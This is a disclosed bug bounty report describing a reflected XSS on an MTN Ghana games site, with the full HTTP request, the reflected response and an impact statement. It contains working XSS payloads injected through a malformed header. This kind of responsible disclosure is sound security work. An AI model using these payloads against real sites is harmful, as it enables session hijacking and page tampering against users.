# Reflected XSS on gamesclub.mtn.com.g

## Report Details
- **Report ID**: 1069528
- **URL**: https://hackerone.com/reports/1069528
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-01-01T04:01:39.116Z
- **Disclosed**: 2021-05-24T07:38:22.387Z

## Reporter
- **Username**: lu3ky-13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
hello dear

I have found Reflected XSS on gamesclub.mtn.com.g
parameters injectable /header.aspx

my payload "><img src=x onerror=prompt``>;<video>
HTTP Header input Referer was set to https://www.google.com/search?hl=en&q=testing'"()&%<acx><ScRiPt >gQmT(9082)</ScRiPt>

HTTP request
===========

```
GET /header.aspx HTTP/1.1
Host: gamesclub.mtn.com.gh
https://www.google.com/search?hl=en&q=testing'"()&%"><img src=x onerror=alert(document.domain)>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _ga=GA1.1.535977033.1609258177; _gid=GA1.3.1739427388.1609466879; ASP.NET_SessionId=31wrle55qcm5sr45ix01xu45; _fbp=fb.2.1609472983351.929571150; __zlcmid=11wjhZBGzje4QJl; mp_41d22b7448ab7bf3fe46553a849e9750_mixpanel=%7B%22distinct_id%22%3A%20%22176bc10ae6a345-0b6ab9a3d75ed18-4c3f207e-1fa400-176bc10ae6b4c3%22%2C%22%24device_id%22%3A%20%22176bc10ae6a345-0b6ab9a3d75ed18-4c3f207e-1fa400-176bc10ae6b4c3%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D; _ga_N94D6VRGVG=GS1.1.1609472987.1.1.1609473387.0
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Server: Microsoft-IIS/8.5
X-AspNet-Version: 2.0.50727
X-Powered-By: ASP.NET
Date: Fri, 01 Jan 2021 04:00:58 GMT
Connection: close
Content-Length: 1833

<b>Date: </b>1/1/2021 4:00:58 AM</br></br><b>Session Id: </b>31wrle55qcm5sr45ix01xu45</br></br><b>Cache-Control</b>--:max-age=0</br></br><b>Connection</b>--:close</br></br><b>Accept</b>--:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</br></br><b>Accept-Encoding</b>--:gzip, deflate</br></br><b>Accept-Language</b>--:en-US,en;q=0.5</br></br><b>Cookie</b>--:_ga=GA1.1.535977033.1609258177; _gid=GA1.3.1739427388.1609466879; ASP.NET_SessionId=31wrle55qcm5sr45ix01xu45; _fbp=fb.2.1609472983351.929571150; __zlcmid=11wjhZBGzje4QJl; mp_41d22b7448ab7bf3fe46553a849e9750_mixpanel=%7B%22distinct_id%22%3A%20%22176bc10ae6a345-0b6ab9a3d75ed18-4c3f207e-1fa400-176bc10ae6b4c3%22%2C%22%24device_id%22%3A%20%22176bc10ae6a345-0b6ab9a3d75ed18-4c3f207e-1fa400-176bc10ae6b4c3%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D; _ga_N94D6VRGVG=GS1.1.1609472987.1.1.1609473387.0</br></br><b>Host</b>--:gamesclub.mtn.com.gh</br></br><b>User-Agent</b>--:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</br></br><b>https</b>--://www.google.com/search?hl=en&q=testing'"()&%"><img src=x onerror=alert(document.domain)></br></br><b>Upgrade-Insecure-Requests</b>--:1</br></br>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>

</title></head>
<body>
    <form name="form1" method="post" action="header.aspx" id="form1">
<div>
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTE2MTY2ODcyMjlkZPAMEC+PM7rDHrcWuoHAcMYZTDHa" />
</div>

<div>

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="D38F0298" />
</div>
    <div>
    
    </div>
    </form>
</body>
</html>

```
{F1140525}

## Impact

Malicious JavaScript has access to all the same objects as the rest of the web page, including access to cookies and local storage, which are often used to store session tokens. If an attacker can obtain a user's session cookie, they can then impersonate that user.

Furthermore, JavaScript can read and make arbitrary modifications to the contents of a page being displayed to a user. Therefore, XSS in conjunction with some clever social engineering opens up a lot of possibilities for an attacker.

## Attachments
- ferfr.PNG
